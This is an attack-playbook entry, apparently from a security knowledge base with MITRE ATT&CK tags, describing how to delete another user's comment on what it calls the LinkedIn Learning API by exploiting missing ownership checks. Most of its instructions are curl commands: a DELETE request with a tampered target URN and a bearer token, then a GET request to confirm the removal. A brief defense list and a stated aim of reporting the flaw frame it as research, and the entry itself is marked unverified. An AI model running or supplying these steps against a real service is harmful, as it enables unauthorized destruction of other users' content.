---
tags:
  - access-control-bypass
  - deletion
  - api
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/curl-delete-comment]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2024-01-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:32:29.103Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: fcdb93d8-ead5-4c45-a534-85d250b61fb0
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Execute-Unauthorized-Comment-Deletion

## Summary

This procedure submits a tampered deletion request to the LinkedIn Learning API, resulting in the removal of another user's comment reply due to missing authorization checks.

## Description

Using the modified URN from the previous procedure, the attacker sends a DELETE request to the API endpoint. The server processes the request without verifying ownership, leading to content tampering. This impacts user experience by disrupting discussions and highlights risks of API abuse in social learning platforms. Prerequisites include a prepared request and authenticated token.

## Requirements

1. Modified deletion request with target URN
2. Active API access token
3. Ability to verify deletion in the UI

## Defense

Defensive measures and detection strategies:

- Enforce strict ownership validation on all mutating API calls
- Monitor for deletion spikes or cross-thread anomalies
- Alert on failed authorization attempts

## Objectives

1. Successfully delete unauthorized comment
2. Confirm impact via UI refresh
3. Demonstrate vulnerability for reporting

## Instructions

### Step 1: Submit the Request

**Context**: Send the altered DELETE request to the API.

**Command** ([[commands/curl-delete-comment]]):
```bash
curl -X DELETE 'https://api.linkedin.com/learning/comments/{target_urn}' \
  -H 'Authorization: Bearer {access_token}' \
  -H 'Content-Type: application/json'
```

> Execute and check for a successful response code (e.g., 204).

### Step 2: Verify Deletion

**Context**: Confirm the comment is removed from the Q&A section.

**Command** ([[commands/curl-delete-comment]]):
```bash
# Refresh the thread
curl -X GET 'https://api.linkedin.com/learning/comments?thread_id={thread_id}' \
  -H 'Authorization: Bearer {access_token}'
```

> Compare response before/after; the target comment should be absent. Check the web UI for visual confirmation.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-delete-comment]]

## Tools Used


## Tags

- [[access-control-bypass]]
- [[deletion]]
- [[api]]
